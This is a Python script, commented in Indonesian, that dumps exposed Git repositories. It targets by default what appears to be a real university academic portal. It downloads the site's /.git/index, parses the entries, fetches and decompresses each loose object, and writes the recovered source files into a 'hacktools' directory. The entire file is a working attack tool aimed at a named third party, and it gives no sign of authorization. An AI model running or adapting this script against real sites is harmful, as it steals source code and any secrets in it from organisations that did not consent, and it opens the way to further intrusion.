#!/usr/bin/env python3
"""Rekonstruksi source dari .git/ target yang terbuka (index + loose objects)."""
import os, re, sys, zlib, struct, requests

BASE = os.environ.get("GITBASE", "https://siak.husadagemilang.ac.id")
OUT = os.environ.get("GITOUT", "$HOME/hacktools/siak_src")
S = requests.Session()
S.headers["User-Agent"] = "Mozilla/5.0"
os.makedirs(OUT, exist_ok=True)


def get(path, binary=True):
    r = S.get(f"{BASE}{path}", timeout=30)
    if r.status_code != 200:
        return None
    return r.content if binary else r.text


def parse_index(data):
    off = 12
    n = struct.unpack(">I", data[off - 4:off])[0]
    out = []
    for _ in range(n):
        start = off
        sha = data[off + 40:off + 60].hex()
        flags = struct.unpack(">H", data[off + 60:off + 62])[0]
        nlen = flags & 0xFFF
        name = data[off + 62:off + 62 + nlen].decode("utf8", "ignore")
        entry_len = (off + 62 + nlen + 8) & ~7
        off = entry_len
        out.append((sha, name))
    return out


def inflate(sha):
    for d in (sha[:2],):
        b = get(f"/.git/objects/{d}/{sha[2:]}")
        if b:
            try:
                raw = zlib.decompress(b)
                # strip header "blob <len>\0"
                return raw.split(b"\x00", 1)[1]
            except Exception:
                return None
    return None


if __name__ == "__main__":
    idx = get("/.git/index")
    if not idx:
        sys.exit("no index")
    entries = parse_index(idx)
    print("entries", len(entries))
    ok = fail = 0
    for sha, name in entries:
        if name.startswith(".git/") or name.endswith("/"):
            continue
        dest = os.path.join(OUT, name)
        if os.path.exists(dest):
            ok += 1
            continue
        blob = inflate(sha)
        if blob is None:
            fail += 1
            continue
        os.makedirs(os.path.dirname(dest) or OUT, exist_ok=True)
        open(dest, "wb").write(blob)
        ok += 1
    print("restored", ok, "missing", fail, "->", OUT)
